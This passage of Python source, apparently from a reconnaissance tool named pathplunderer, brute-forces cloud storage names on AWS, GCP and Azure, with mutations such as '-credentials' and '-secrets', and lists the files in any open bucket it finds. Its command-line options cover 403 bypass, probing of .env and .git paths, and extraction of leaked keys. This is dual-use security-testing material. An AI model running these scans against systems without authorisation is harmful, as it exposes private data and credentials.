                    return {"name": name, "url": url, "status": sc,
                            "access": "public", "files": files}
                elif sc == 403:
                    return {"name": name, "url": url, "status": sc,
                            "access": "private (exists)", "files": []}
            except Exception: pass
        if pbar: pbar.update(1)
        return None

    def run(self):
        if not self.quiet: tqdm.write(pretty_banner(self.no_color))
        tqdm.write(Fore.CYAN + f"\n  [CLOUD] Bruteforcing cloud bucket (GCP)s  |  Words: {len(self.wordlist)}" + Fore.RESET)
        tqdm.write(("" if self.no_color else Fore.CYAN) + "═" * __import__("shutil").get_terminal_size((100,24)).columns + Style.RESET_ALL)
        session = self._make_session()
        output_lines = []
        pbar = tqdm(total=len(self.wordlist), desc="  gcs", leave=False) if not self.no_progress else None

        def _worker(word):
            res = self._check_bucket(session, word, pbar)
            if pbar: pbar.update(1)
            if res:
                access_col = Fore.GREEN if res["access"] == "public" else Fore.YELLOW
                line = (f"  {access_col}[{res['access'].upper()}]{Fore.RESET}"
                        f"  [{colorize_status(res['status'])}]"
                        f"  {res['url']}")
                if res["files"]: line += f"\n    Files: {', '.join(res['files'])}"
                tqdm.write(line)
                with self._lock:
                    self.results.append(res)
                    output_lines.append(f"[{res['access']}]  [{res['status']}]  {res['url']}")

        try:
            with ThreadPoolExecutor(max_workers=self.threads) as ex:
                futs = [ex.submit(_worker, w) for w in self.wordlist]
                for f in as_completed(futs):
                    if self._stop.is_set(): [ff.cancel() for ff in futs]; break
                    try: f.result()
                    except Exception: pass
        finally:
            if pbar: pbar.close()
        tqdm.write(("" if self.no_color else Fore.CYAN) + "═" * __import__("shutil").get_terminal_size((100,24)).columns + Style.RESET_ALL)
        tqdm.write(Fore.CYAN + f"\n  [CLOUD] Found: {len(self.results)} bucket(s)" + Fore.RESET)
        if self.output and output_lines:
            with open(self.output, "w", encoding="utf-8") as f: f.write("\n".join(output_lines)+"\n")
            tqdm.write(Fore.GREEN + f"  [OUTPUT] Saved → {self.output}" + Fore.RESET)
        return self.results


# ─────────────────────────────────────────────────────────────────────────────
#  CLI
# ─────────────────────────────────────────────────────────────────────────────

# ─────────────────────────────────────────────────────────────────────────────
#  CLOUD SCANNER  (S3 + GCP combined, cloud_enum methodology)
# ─────────────────────────────────────────────────────────────────────────────
# ── Cloud mutations (merged cloud_enum + lazys3 style) ──────────────────────
# These are applied as both prefix and suffix variants to each keyword.
# On first use, the wordlists/cloud_mutations.txt file is also loaded if present.
CLOUD_MUTATIONS_DEFAULT = [
    # Exact keyword (always test bare keyword first)
    "",
    # Hyphen-suffix variants (cloud_enum style)
    "-backup", "-backups", "-data", "-db", "-dev", "-development", "-prod",
    "-production", "-staging", "-stage", "-test", "-testing", "-temp", "-tmp",
    "-static", "-assets", "-media", "-uploads", "-files", "-logs", "-log",
    "-archive", "-archives", "-config", "-configs", "-bucket", "-storage",
    "-public", "-private", "-internal", "-admin", "-api", "-app", "-web",
    "-www", "-cdn", "-content", "-docs", "-documents", "-images", "-videos",
    "-exports", "-imports", "-reports", "-resources", "-secrets", "-env",
    "-sandbox", "-uat", "-qa", "-demo", "-preview", "-release", "-build",
    "-deploy", "-deployment", "-artifact", "-artifacts", "-packages",
    "-registry", "-repo", "-repository", "-source", "-src", "-code",
    "-scripts", "-bin", "-dist", "-release", "-releases", "-downloads",
    "-software", "-tools", "-util", "-utilities", "-portal", "-dashboard",
    "-helpdesk", "-support", "-hr", "-finance", "-legal", "-marketing",
    "-sales", "-ops", "-devops", "-infra", "-infrastructure", "-network",
    "-database", "-db", "-mysql", "-postgres", "-mongo", "-redis", "-cache",
    "-elastic", "-search", "-es", "-kibana", "-grafana", "-prometheus",
    "-monitoring", "-alerts", "-metrics", "-analytics", "-tracking",
    "-audit", "-compliance", "-security", "-ssl", "-certs", "-certificates",
    "-keys", "-tokens", "-credentials", "-creds", "-passwords", "-passwd",
    "-private-keys", "-ssh", "-vpn", "-firewall", "-waf",
    "-email", "-mail", "-smtp", "-imap", "-mx",
    "-mobile", "-android", "-ios", "-app", "-apps",
    "-frontend", "-backend", "-server", "-client",
    "-2023", "-2024", "-2025", "-old", "-new", "-bak", "-copy",
    # Dot-suffix variants
    ".backup", ".dev", ".prod", ".staging", ".old", ".new", ".bak",
    ".data", ".config", ".env", ".log", ".logs", ".tmp", ".temp",
    # Prefix variants (lazys3 style)
    "backup-", "dev-", "prod-", "staging-", "test-", "temp-", "data-",
    "media-", "static-", "assets-", "uploads-", "files-", "logs-",
    "archive-", "public-", "private-", "internal-", "admin-", "api-",
    "cdn-", "content-", "docs-", "images-", "videos-", "reports-",
    "s3-", "bucket-", "storage-", "cloud-", "aws-", "gcp-", "azure-",
    # Common org patterns
    "corp-", "corp.", "-corp", ".corp",
    "inc-", "-inc", "llc-", "-llc",
    "io-", "-io", ".io",
    # Number suffixes (frequently misconfigured)
    "-1", "-2", "-3", "-01", "-02",
    # Environment tags
    "-prd", "-stg", "-tst", "-dev", "-local", "-local-dev", "-local-test", "-localdev",
]

AWS_S3_CHECKS = [
    # Path-style (legacy, still works for many regions)
    "https://s3.amazonaws.com/{name}",
    # Virtual-hosted style (preferred, per AWS best practices)
    "https://{name}.s3.amazonaws.com",
    # Multi-region endpoints  (lazys3 covers these)
    "https://{name}.s3.us-east-1.amazonaws.com",
    "https://{name}.s3.us-east-2.amazonaws.com",
    "https://{name}.s3.us-west-1.amazonaws.com",
    "https://{name}.s3.us-west-2.amazonaws.com",
    "https://{name}.s3.eu-west-1.amazonaws.com",
    "https://{name}.s3.eu-west-2.amazonaws.com",
    "https://{name}.s3.eu-west-3.amazonaws.com",
    "https://{name}.s3.eu-central-1.amazonaws.com",
    "https://{name}.s3.eu-north-1.amazonaws.com",
    "https://{name}.s3.ap-south-1.amazonaws.com",
    "https://{name}.s3.ap-southeast-1.amazonaws.com",
    "https://{name}.s3.ap-southeast-2.amazonaws.com",
    "https://{name}.s3.ap-northeast-1.amazonaws.com",
    "https://{name}.s3.ap-northeast-2.amazonaws.com",
    "https://{name}.s3.sa-east-1.amazonaws.com",
    "https://{name}.s3.ca-central-1.amazonaws.com",
    # local-variant (lazys3 style)
    "https://{name}-local.s3.amazonaws.com",
    # HTTP (misconfigured buckets sometimes only on HTTP)
    "http://{name}.s3.amazonaws.com",
    "http://s3.amazonaws.com/{name}",
]
GCP_CHECKS = [
    # Public bucket XML API (most permissive)
    "https://storage.googleapis.com/{name}",
    # Subdomain style
    "https://{name}.storage.googleapis.com",
    # JSON API  (returns file list as JSON)
    "https://www.googleapis.com/storage/v1/b/{name}/o?maxResults=20",
    # Cloud console URL
    "https://storage.cloud.google.com/{name}",
    # Firebase storage (common for mobile apps)
    "https://firebasestorage.googleapis.com/v0/b/{name}",
    "https://firebasestorage.googleapis.com/v0/b/{name}.appspot.com",
    # App Engine buckets
    "https://storage.googleapis.com/{name}.appspot.com",
]
AZURE_CHECKS = [
    # Blob storage (most common)
    "https://{name}.blob.core.windows.net",
    "https://{name}.blob.core.windows.net?restype=container&comp=list",
    # App Service / Functions
    "https://{name}.azurewebsites.net",
    # File / Queue / Table storage
    "https://{name}.file.core.windows.net",
    "https://{name}.queue.core.windows.net",
    "https://{name}.table.core.windows.net",
    # CDN endpoints
    "https://{name}.azureedge.net",
    # Azure Container Registry
    "https://{name}.azurecr.io",
    # Static website hosting
    "https://{name}.z13.web.core.windows.net",
    "https://{name}.z16.web.core.windows.net",
]


def _load_cloud_wordlist_from_folder() -> List[str]:
    """Load cloud mutations from wordlists/ folder, stripping # comments."""
    base = Path(__file__).parent / "wordlists"
    candidates = [
        base / "cloud_mutations.txt",
        base / "cloud_enum_fuzz.txt",
        base / "lazys3.txt",
        base / "cloud.txt",
    ]
    loaded: List[str] = []
    for c in candidates:
        if c.exists():
            with open(c, encoding="utf-8", errors="ignore") as f:
                for raw in f:
                    line = raw.strip()
                    if line and not line.startswith("#"):
                        loaded.append(line)
    return loaded if loaded else CLOUD_MUTATIONS_DEFAULT[:]

class CloudScanner:
    """
    Multi-cloud bucket/storage brute-forcer using keyword+mutations approach
    (inspired by cloud_enum). Checks AWS S3, GCP Storage, Azure Blob.
    """

    def __init__(self, keywords=None, keyfile=None, mutations=None,
                 threads=5, nameserver=None, logfile=None, log_format="text",
                 disable_aws=False, disable_gcp=False, disable_azure=False,
                 quickscan=False, max_files=5, show_files=True,
                 user_agent=None, random_agent=False, proxy_url="",
                 insecure=False, timeout=10, quiet=False, no_progress=False,
                 no_error=False, no_color=False, debug=False):
        # Build keyword list
        self.keywords: List[str] = []
        if keywords:
            self.keywords.extend(keywords if isinstance(keywords, list) else [keywords])
        if keyfile:
            kf = Path(keyfile)
            if kf.exists():
                with open(kf, encoding="utf-8", errors="ignore") as f:
                    self.keywords.extend(l.strip() for l in f if l.strip())
        if not self.keywords:
            raise ValueError("At least one keyword required (-k or -kf)")

        # Build mutations
        if quickscan:
            self.mutations = [""]
        elif mutations:
            mf = Path(mutations)
            if mf.exists():
                with open(mf, encoding="utf-8", errors="ignore") as f:
                    self.mutations = [l.strip() for l in f if l.strip()]
            else:
                self.mutations = _load_cloud_wordlist_from_folder()
        else:
            self.mutations = _load_cloud_wordlist_from_folder()

        self.disable_aws   = disable_aws
        self.disable_gcp   = disable_gcp
        self.disable_azure = disable_azure
        self.quickscan     = quickscan
        self.threads       = threads
        self.nameserver    = nameserver
        self.logfile       = logfile
        self.log_format    = log_format
        self.max_files     = max_files
        self.show_files    = show_files
        self.random_agent  = random_agent
        self.user_agent    = choice(USER_AGENT_LIST) if random_agent else (user_agent or default_user_agent())
        self.proxy_url     = proxy_url
        self.insecure      = insecure
        self.timeout       = timeout
        self.quiet         = quiet
        self.no_progress   = no_progress
        self.no_error      = no_error
        self.no_color      = no_color
        self.debug         = debug
        self._stop         = threading.Event()
        self._lock         = threading.Lock()
        self.results: List[Dict] = []
        self._log_lines: List[str] = []
        try: signal.signal(signal.SIGINT, lambda s, f: self._stop.set())
        except (OSError, ValueError): pass

    def _make_session(self) -> requests.Session:
        session = requests.Session()
        session.verify = not self.insecure
        if self.proxy_url:
            session.verify = False
            session.proxies = {"http": self.proxy_url, "https": self.proxy_url}
        session.headers["User-Agent"] = choice(USER_AGENT_LIST) if self.random_agent else self.user_agent
        return session

    def _generate_names(self) -> List[str]:
        names = set()
        for kw in self.keywords:
            kw = kw.strip().lower().replace(" ", "-")
            names.add(kw)
            for mut in self.mutations:
                mut = mut.strip()
                names.add(f"{kw}{mut}")
                names.add(f"{mut}{kw}" if mut and not mut.startswith("-") and not mut.startswith(".") else f"{kw}{mut}")
        return sorted(names)

    def _check_endpoint(self, session: requests.Session, url: str, platform: str, name: str) -> Optional[Dict]:
        try:
            resp = session.get(url, timeout=self.timeout, allow_redirects=True)
            sc   = resp.status_code
            size = len(resp.content)

            status_label = None
            files = []

            if sc == 200:
                status_label = "OPEN"
                if self.show_files:
                    # Try XML listing (S3/GCP)
                    keys = re.findall(r'<Key>([^<]+)</Key>', resp.text)
                    if not keys:
                        # Try JSON (GCP API)
                        try:
                            data = resp.json()
                            keys = [i.get("name","") for i in data.get("items",[])]
                        except Exception:
                            pass
                    files = keys[:self.max_files]
            elif sc == 403:
                status_label = "PRIVATE"
            elif sc == 301 or sc == 302:
                redir = resp.headers.get("Location","")
                status_label = f"REDIRECT→{redir[:60]}"
            elif sc == 404 or sc == 400:
                return None
            elif sc >= 500:
                status_label = f"ERROR-{sc}"
            else:
                return None

            if status_label:
                return {"platform": platform, "name": name, "url": url,
                        "status": sc, "label": status_label, "files": files, "size": size}
        except Exception as e:
            if self.debug:
                tqdm.write(Fore.RED + f"  [CLOUD ERR] {url}: {e}" + Fore.RESET)
        return None

    def _check_azure_dns(self, name: str) -> Optional[Dict]:
        """Check Azure via DNS (CNAME to azurewebsites/blob) — no HTTP needed."""
        for suffix in [".blob.core.windows.net", ".azurewebsites.net",
                       ".cloudapp.azure.com", ".azurecontainer.io", ".azurecr.io"]:
            fqdn = f"{name}{suffix}"
            try:
                socket.getaddrinfo(fqdn, None)
                return {"platform": "Azure-DNS", "name": name,
                        "url": f"https://{fqdn}", "status": 0,
                        "label": f"DNS-EXISTS ({suffix.lstrip('.')})", "files": [], "size": 0}
            except socket.gaierror:
                pass
        return None

    def _print_result(self, res: Dict):
        platform = res["platform"]
        label    = res["label"]
        pcol = {"AWS-S3": Fore.YELLOW, "GCP": Fore.BLUE,
                "Azure": Fore.CYAN, "Azure-DNS": Fore.CYAN}.get(platform, Fore.WHITE)
        if "OPEN" in label or "DNS" in label:
            lcol = Fore.GREEN + Style.BRIGHT
            marker = "✔"
        elif "PRIVATE" in label:
            lcol = Fore.YELLOW
            marker = "🔒"
        elif "REDIRECT" in label:
            lcol = Fore.BLUE
            marker = "→"
        else:
            lcol = Fore.RED
            marker = "✖"

        line = (f"  {marker}  {pcol}{platform:<10}{Style.RESET_ALL}"
                f"  {lcol}{label:<30}{Style.RESET_ALL}"
                f"  {res['url']}")
        if res["files"]:
            line += f"\n    {Fore.GREEN}Files ({len(res['files'])}): {', '.join(res['files'][:self.max_files])}{Style.RESET_ALL}"
        tqdm.write(line)
        with self._lock:
            self.results.append(res)
            log_entry = f"[{platform}] [{label}] {res['url']}"
            if res["files"]: log_entry += f" Files: {','.join(res['files'])}"
            self._log_lines.append(log_entry)

    def run(self):
        if not self.quiet: tqdm.write(pretty_banner(self.no_color))

        names = self._generate_names()
        enabled = []
        if not self.disable_aws:   enabled.append("AWS S3")
        if not self.disable_gcp:   enabled.append("GCP Storage")
        if not self.disable_azure: enabled.append("Azure Blob")

        import shutil as _sh
        tw  = _sh.get_terminal_size((100,24)).columns
        div = ("" if self.no_color else Fore.CYAN) + "═" * tw + Style.RESET_ALL

        tqdm.write(div)
        tqdm.write((Fore.CYAN + Style.BRIGHT if not self.no_color else "") + "  CLOUD ENUMERATION".center(tw) + Style.RESET_ALL)
        tqdm.write(div)
        tqdm.write(Fore.GREEN  + f"  Keywords:  {', '.join(self.keywords)}" + Style.RESET_ALL)
        tqdm.write(Fore.GREEN  + f"  Mutations: {len(self.mutations)} variants loaded" + Style.RESET_ALL)
        tqdm.write(Fore.CYAN   + f"  Names:     {len(names)} unique combinations generated" + Style.RESET_ALL)
        tqdm.write(Fore.YELLOW + f"  Platforms: {' | '.join(enabled)}" + Style.RESET_ALL)
        tqdm.write(Fore.CYAN   + f"  Threads:   {self.threads}    Timeout: {self.timeout}s" + Style.RESET_ALL)
        tqdm.write(div)
        if not self.disable_aws:
            tqdm.write(Fore.YELLOW + Style.BRIGHT + "\n  [ AMAZON S3 ]" + Style.RESET_ALL)
        if not self.disable_gcp:
            tqdm.write(Fore.BLUE  + Style.BRIGHT + "\n  [ GOOGLE CLOUD ]" + Style.RESET_ALL)
        if not self.disable_azure:
            tqdm.write(Fore.CYAN  + Style.BRIGHT + "\n  [ MICROSOFT AZURE ]" + Style.RESET_ALL)
        tqdm.write("")

        session = self._make_session()

        # Build all tasks
        tasks: List[tuple] = []  # (session, url, platform, name)
        for name in names:
            if not self.disable_aws:
                for tpl in AWS_S3_CHECKS:
                    tasks.append((session, tpl.format(name=name), "AWS-S3", name))
            if not self.disable_gcp:
                for tpl in GCP_CHECKS:
                    tasks.append((session, tpl.format(name=name), "GCP", name))
            if not self.disable_azure:
                for tpl in AZURE_CHECKS:
                    tasks.append((session, tpl.format(name=name), "Azure", name))
                tasks.append((None, "", "Azure-DNS", name))  # DNS check

        total = len(tasks)
        pbar = tqdm(total=total, desc="  cloud", leave=False) if not self.no_progress else None

        def _worker(task):
            sess, url, platform, name = task
            if self._stop.is_set(): return
            if platform == "Azure-DNS":
                res = self._check_azure_dns(name)
            else:
                res = self._check_endpoint(sess, url, platform, name)
            if pbar: pbar.update(1)
            if res: self._print_result(res)

        try:
            with ThreadPoolExecutor(max_workers=self.threads) as ex:
                futs = [ex.submit(_worker, t) for t in tasks]
                for f in as_completed(futs):
                    if self._stop.is_set(): [ff.cancel() for ff in futs]; break
                    try: f.result()
                    except Exception: pass
        finally:
            if pbar: pbar.close()

        tqdm.write(("" if self.no_color else Fore.CYAN) + "═" * __import__("shutil").get_terminal_size((100,24)).columns + Style.RESET_ALL)
        tqdm.write(Fore.CYAN + f"\n  [CLOUD] Found: {len(self.results)} result(s)" + Style.RESET_ALL)

        # Logging
        if self.logfile and self._log_lines:
            try:
                with open(self.logfile, "a", encoding="utf-8") as f:
                    if self.log_format == "json":
                        f.write(json.dumps(self.results, indent=2) + "\n")
                    elif self.log_format == "csv":
                        f.write("platform,label,url,files\n")
                        for r in self.results:
                            f.write(f"{r['platform']},{r['label']},{r['url']},{','.join(r['files'])}\n")
                    else:
                        f.write("\n".join(self._log_lines) + "\n")
                tqdm.write(Fore.GREEN + f"  [CLOUD] Saved → {self.logfile}" + Style.RESET_ALL)
            except Exception as e:
                tqdm.write(Fore.RED + f"  [CLOUD] Save failed: {e}" + Style.RESET_ALL)
        return self.results


# ─────────────────────────────────────────────────────────────────────────────
#  HELP FORMATTER  — aligned, colourful, explained
# ─────────────────────────────────────────────────────────────────────────────
class PPHelpFormatter(argparse.HelpFormatter):
    """Right-aligns flag column, bolds group headers, preserves banner."""

    def __init__(self, prog, indent_increment=2, max_help_position=36, width=90):
        super().__init__(prog, indent_increment, max_help_position, width)

    def _fill_text(self, text, width, indent):
        return indent + ("\n" + indent).join(text.splitlines()) + "\n"

    def _format_description(self, description):
        if description:
            return self._fill_text(description, self._width, "") + "\n"
        return ""

    def start_section(self, heading):
        clean = (heading or "").rstrip(":")
        super().start_section(Fore.CYAN + Style.BRIGHT + "  " + clean + Style.RESET_ALL)

    def _format_usage(self, usage, actions, groups, prefix):
        return ""   # printed manually in each mode's description

    def _format_action_invocation(self, action):
        if not action.option_strings:
            return Fore.GREEN + super()._format_action_invocation(action) + Style.RESET_ALL
        parts = list(action.option_strings)
        if action.nargs != 0 and action.metavar:
            parts[-1] += " " + Fore.WHITE + action.metavar + Style.RESET_ALL
        return Fore.GREEN + ", ".join(parts) + Style.RESET_ALL

    def _format_action(self, action):
        result = super()._format_action(action)
        return result

    def _get_help_string(self, action):
        return action.help or ""


def _divider(char="─", width=None, color=Fore.CYAN):
    import shutil as _sh
    w = width or _sh.get_terminal_size((100, 24)).columns
    return color + (char * w) + Style.RESET_ALL


def _mode_header(mode_name: str, color, desc: str) -> str:
    banner = pretty_banner(no_color=False)
    return (banner +
            _divider("═") + "\n" +
            f"  {color + Style.BRIGHT}MODE: {mode_name.upper()}{Style.RESET_ALL}  —  {desc}\n" +
            _divider() + "\n")


# ─────────────────────────────────────────────────────────────────────────────
#  PER-MODE PARSERS
# ─────────────────────────────────────────────────────────────────────────────
def _build_dir_parser() -> argparse.ArgumentParser:
    desc = _mode_header("dir", Fore.GREEN,
        "Web directory & file brute-force, 403 bypass, Wayback Machine, secret extraction")
    usage = (f"  {Fore.YELLOW}Usage:{Style.RESET_ALL}  pathplunderer.py -m dir "
             f"-u <URL> -w <WORDLIST> [options]\n"
             f"  {Fore.WHITE + Style.DIM}e.g.   pathplunderer.py -m dir -u https://target.com -w common.txt --probe --secrets{Style.RESET_ALL}\n")

    p = argparse.ArgumentParser(prog="pathplunderer.py -m dir",
        description=desc + usage, formatter_class=PPHelpFormatter, add_help=False)

    # TARGET
    g = p.add_argument_group("Target")
    g.add_argument("-u",  "--url",       metavar="URL",      help="Target URL (http/https, auto-detected if omitted)")
    g.add_argument("--url-file",         metavar="FILE",     dest="url_file", help="File of URLs, one per line (Windows-friendly)")

    # WORDLIST
    g = p.add_argument_group("Wordlist")
    g.add_argument("-w",  "--wordlist",  metavar="FILE",     dest="wordfile", default="-", help="Wordlist path  (- = STDIN)")
    g.add_argument("--wo","--wordlist-offset", metavar="N",  dest="wordlist_offset", type=int, default=0, help="Skip first N words  (resume)")
    g.add_argument("-p",  "--pattern",   metavar="FILE",     dest="pattern_file", help="Pattern file for {PATTERN} substitution")
    g.add_argument("-x",  "--extensions",metavar="php,html", dest="exts", type=lister, help="File extensions to append to each word")
    g.add_argument("-X",  "--ext-file",  metavar="FILE",     dest="exts_file", help="File with one extension per line")
    g.add_argument("-f",  "--add-slash", action="store_true",dest="add_slash", default=False, help="Append / to every request")

    # AUTH
    g = p.add_argument_group("Authentication")
    g.add_argument("-U",  "--username",  metavar="USER",     dest="user",     help="HTTP Basic Auth username")
    g.add_argument("-P",  "--password",  metavar="PASS",     dest="password", help="HTTP Basic Auth password")

    # REQUEST
    g = p.add_argument_group("Request")
    g.add_argument("-m2", "--method",    metavar="METHOD",   dest="methods",  default="GET", help="HTTP method  (default: GET)")
    g.add_argument("-H",  "--headers",   metavar="H:V,...",  dest="headers",  default="",   help="Custom headers  e.g. 'X-Token:abc,Accept:*/*'")
    g.add_argument("--nch",              action="store_true",dest="no_canonicalize_headers", default=False, help="Send headers with exact casing (no title-case)")
    g.add_argument("-c",  "--cookies",   metavar="K=V,...",  dest="cookies",  default="",   help="Cookies  e.g. 'session=abc,csrf=xyz'")
    g.add_argument("-d",  "--data",      metavar="DATA",     dest="data",     default="",   help="Raw request body")
    g.add_argument("--data-json",        metavar="JSON",     dest="data_json",default="",   help="JSON POST body  (auto-sets Content-Type + switches to POST)")
    g.add_argument("--data-urlencoded",  metavar="DATA",     dest="data_urlencoded",default="", help="URL-encoded POST body")
    g.add_argument("-Q",  "--query",     metavar="K=V,...",  dest="query_params",default="", help="Query params appended to every URL")
    g.add_argument("-a",  "--useragent", metavar="UA",       dest="user_agent", help="Custom User-Agent string")
    g.add_argument("--rua","--random-agent", action="store_true", dest="random_agent", default=False, help="Pick a random User-Agent each session")
    g.add_argument("-r",  "--follow-redirect", action="store_true", dest="follow_redirect", default=False, help="Follow HTTP redirects")

    # TLS / PROXY
    g = p.add_argument_group("TLS & Proxy")
    g.add_argument("-k",  "--insecure",  action="store_true", dest="insecure", default=False, help="Skip TLS certificate verification")
    g.add_argument("--proxy",            metavar="URL",       dest="proxy_url",default="",   help="Upstream proxy  http(s)://host:port  or  socks5://host:port")
    g.add_argument("--burp",             action="store_true", dest="burp",     default=False, help="Shortcut: proxy 127.0.0.1:8080 + insecure (Burp Suite)")
    g.add_argument("--replay-proxy",     metavar="URL",       dest="replay_proxy",default="", help="Replay found results through this proxy")
    g.add_argument("--client-cert",      metavar="PEM",       dest="client_cert", help="mTLS client certificate (PEM file)")
    g.add_argument("--client-key",       metavar="PEM",       dest="client_key",  help="mTLS client private key (PEM file)")

    # TIMING
    g = p.add_argument_group("Timing & Reliability")
    g.add_argument("-t",  "--threads",   metavar="N",         dest="threads",  type=int,   default=DEFAULT_THREADS, help=f"Concurrent threads  (default: {DEFAULT_THREADS})")
    g.add_argument("--timeout",          metavar="SEC",       dest="timeout",  type=int,   default=DEFAULT_TIMEOUT, help=f"Per-request timeout  (default: {DEFAULT_TIMEOUT}s)")
    g.add_argument("--delay",            metavar="SEC",       dest="delay",    type=float, default=0.0,  help="Per-thread sleep between requests  e.g. 0.5")
    g.add_argument("--rate-limit",       metavar="N/s",       dest="rate_limit",type=float,default=0,   help="Global max requests/sec across all threads  (0 = unlimited)")
    g.add_argument("--retry",            action="store_true", dest="retry",    default=False, help="Retry timed-out requests")
    g.add_argument("--ra","--retry-attempts", metavar="N",    dest="retry_attempts",type=int,default=DEFAULT_RETRY, help=f"Number of retries  (default: {DEFAULT_RETRY})")
    g.add_argument("--auto-throttle",    action="store_true", dest="auto_throttle",default=False, help="Auto-halve threads when sustained error rate exceeds 80 percent")

    # STATUS CODES
    g = p.add_argument_group("Status Codes")
    g.add_argument("-s",  "--status-codes",     metavar="CODES", dest="codes",           type=lister, default=DEFAULT_STATUS_CODES, help="Allow-list codes  (default: 200,204,301,302,307,401,403)")
    g.add_argument("-b",  "--status-blacklist",  metavar="CODES", dest="blacklist_codes", type=lister, default=DEFAULT_BLACKLIST,    help="Deny-list codes   (default: 404)")

    # SCAN CONTROL
    g = p.add_argument_group("Scan Control")
    g.add_argument("--recurse",       action="store_true",  dest="full_recurse",  default=False,
                   help="Full recursion into ALL discovered directories including static ones")
    g.add_argument("--no-recurse",    action="store_true",  dest="no_recurse",    default=False,
                   help="Disable all recursion including smart-recurse (completely flat scan)")
    g.add_argument("--depth",         metavar="N",          dest="depth",   type=int, default=DEFAULT_DEPTH,
                   help=f"Max recursion depth  (default: {DEFAULT_DEPTH})   —   applies to both smart and full recurse")
    g.add_argument("--force",        action="store_true",  dest="force",   default=False, help="Scan even when wildcard response detected")
    g.add_argument("--no-crawl",     action="store_false", dest="crawl",   default=True,  help="Disable auto-crawl of base URL for extra paths  (crawl is ON by default)")
    g.add_argument("--dont-scan",    metavar="PAT",        dest="dont_scan",nargs="*", default=[], help="URL substrings to never request")
    g.add_argument("--resp-limit",   metavar="BYTES",      dest="response_size_limit", type=int, default=DEFAULT_RESP_LIMIT, help=f"Max body bytes to read per response  (default: {DEFAULT_RESP_LIMIT//1024}KB)")

    # FILTERS
    g = p.add_argument_group("Response Filters")
    g.add_argument("-S",  "--filter-size",   metavar="N",     dest="filter_size",   nargs="*", help="Drop responses with this exact byte size")
    g.add_argument("-W",  "--filter-words",  metavar="N",     dest="filter_words",  nargs="*", help="Drop responses with this word count")
    g.add_argument("-N",  "--filter-lines",  metavar="N",     dest="filter_lines",  nargs="*", help="Drop responses with this line count")
    g.add_argument("-Xr", "--filter-regex",  metavar="REGEX", dest="filter_regex",  default=None, help="Drop responses matching this regex")
    g.add_argument("-C",  "--filter-status", metavar="CODE",  dest="filter_status", nargs="*", help="Drop responses with these status codes")
    g.add_argument("--filter-similar-to",    metavar="URL",   dest="filter_similar",default=None, help="Drop responses similar to this URL's body  (>95 pct match)")
    g.add_argument("--xl","--exclude-length",metavar="N",     dest="exclude_length",nargs="*", help="Drop responses of these exact content lengths")

    # DISCOVERY
    g = p.add_argument_group("Dynamic Discovery")
    g.add_argument("--db","--discover-backup",  action="store_true", dest="collect_backups",    default=False, help="Check backup variants (.bak .old ~ .orig .swp) for found files")
    g.add_argument("-E",  "--collect-extensions",action="store_true",dest="collect_extensions", default=False, help="Auto-collect new extensions seen in responses")
    g.add_argument("-g",  "--collect-words",     action="store_true",dest="collect_words",      default=False, help="Auto-collect new words from response links")
    g.add_argument("--links",                    action="store_true",dest="extract_links",      default=False, help="Extract and follow links during scan  (enables --collect-words)")

    # 403 BYPASS
    g = p.add_argument_group("403 Bypass  (100+ techniques)")
    g.add_argument("--bypass-403",    action="store_true", dest="bypass_403",  default=False, help="After scan: run all bypass techniques on every 403 response")
    g.add_argument("--bypass-only",   action="store_true", dest="bypass_only", default=False, help="Skip directory scan — only run bypass on the target URL(s)")
    g.add_argument("--bypass-urls",   metavar="URL,URL",   dest="bypass_urls_raw",default="",  help="Additional comma-separated URLs to bypass  (use with --bypass-only)")

    # WAYBACK
    g = p.add_argument_group("Wayback Machine")
    g.add_argument("--wayback",        action="store_true", dest="wayback",      default=False, help="After scan: query Wayback CDX API for sensitive-keyword URLs")
    g.add_argument("--wayback-only",   action="store_true", dest="wayback_only", default=False, help="Skip directory scan — only run Wayback query")
    g.add_argument("--wayback-all",    action="store_true", dest="wayback_all",  default=False, help="Dump ALL archived URLs (no keyword filter, no live status check)")
    g.add_argument("--wayback-output", metavar="FILE",      dest="wayback_output",default=None, help="Save Wayback results to this file  (always printed to screen too)")
    g.add_argument("--wayback-filter-status", metavar="CODES", dest="wayback_filter_status",
                   type=lister, default=None, help="Only show Wayback results with these status codes  e.g. 200,301,403")

    # PROBE & SECRETS
    g = p.add_argument_group("Probe & Secret Extraction")
    g.add_argument("--probe",     action="store_true", dest="probe",           default=False,
                   help="Probe ~130 well-known sensitive paths: .git .env .htpasswd admin panels swagger actuator backups")
    g.add_argument("--secrets",   action="store_true", dest="extract_secrets", default=False,
                   help="Scan every response body for leaked credentials: AWS keys JWTs API tokens private keys .env dumps")
    g.add_argument("--wp-detect", action="store_true", dest="wp_detect",       default=False,
                   help="Detect WordPress theme/plugin names and versions from HTML during crawl")

    # COMPOSITE SHORTCUTS
    g = p.add_argument_group("Composite Shortcuts")
    g.add_argument("--smart",    action="store_true", default=False, help="Enable: --collect-words + --discover-backup")
    g.add_argument("--thorough", action="store_true", default=False, help="Enable: --smart + --collect-extensions + --probe + --secrets")

    # OUTPUT
    g = p.add_argument_group("Output")
    g.add_argument("-o",  "--output",    metavar="FILE", dest="logfile",    default=None, help="Write results to this file")
    g.add_argument("--json",             action="store_true", dest="output_json", default=False, help="Also write JSON output alongside text log")
    g.add_argument("-q",  "--quiet",     action="store_true", dest="quiet",      default=False, help="Suppress banner and config header")
    g.add_argument("--np","--no-progress",action="store_true",dest="no_progress",default=False, help="Hide the progress bar")
    g.add_argument("--ne","--no-error",  action="store_true", dest="no_error",   default=False, help="Suppress connection / timeout error messages")
    g.add_argument("--nc","--no-color",  action="store_true", dest="no_color",   default=False, help="Disable ANSI color output  (useful for piping)")
    g.add_argument("--hl","--hide-length",action="store_true",dest="hide_length",default=False, help="Omit response body length from output")
    g.add_argument("-v",  "--verbose",   action="count",      dest="verbose",    default=0,     help="-v lists URLs by status in summary  /  -vv also shows timeouts")
    g.add_argument("--debug",            action="store_true", dest="debug",      default=False, help="Print full error tracebacks and raw request errors")
    g.add_argument("-h",  "--help",      action="help",                                         help="Show this help message and exit")

    return p


def _build_subdomain_parser() -> argparse.ArgumentParser:
    desc = _mode_header("subdomain", Fore.MAGENTA,
        "DNS subdomain brute-force / enumeration")
    usage = (f"  {Fore.YELLOW}Usage:{Style.RESET_ALL}  pathplunderer.py -m subdomain --domain target.com -w subdomains.txt\n"
             f"  {Style.DIM}e.g.   pathplunderer.py -m subdomain --domain example.com -w subs.txt --resolver 8.8.8.8{Style.RESET_ALL}\n")

    p = argparse.ArgumentParser(prog="pathplunderer.py -m subdomain",
        description=desc + usage, formatter_class=PPHelpFormatter, add_help=False)

